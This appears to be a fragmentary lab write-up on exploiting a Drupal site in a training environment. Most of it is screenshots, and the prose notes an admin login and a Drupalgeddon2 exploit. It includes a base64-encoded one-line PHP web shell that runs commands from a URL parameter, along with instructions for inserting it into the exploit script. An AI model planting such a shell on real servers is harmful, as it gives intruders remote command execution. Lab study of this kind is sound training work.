...
![[Pasted image 20260412221110.png]]
...
![[Pasted image 20260412221134.png]]
...
![[Pasted image 20260412222409.png]]
...
![[Pasted image 20260412231111.png]]
...
![[Pasted image 20260412233300.png]]
...
BOOM, we can now login as admin.
![[Pasted image 20260413000125.png]]
...
Lets check if hello.php was literally updated 
```shell
curl -s http://drupal-dev.inlanefreight.local/hello.txt

# Yes
```
![[Pasted image 20260413011240.png]]

Now lets try to upload a shell
```php
...
Now we will have to edit the drupalgeddon2.py script,  let's replace the `echo` command in the exploit script with a command to write out our malicious PHP script.

```
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

![[Pasted image 20260413011405.png]]to
![[Pasted image 20260413011509.png]]
...
![[Pasted image 20260413011711.png]]
![[Pasted image 20260413012231.png]]
...
![[Pasted image 20260413004650.png]]
...
---
Only Drupalgeddon2 is done by us practical
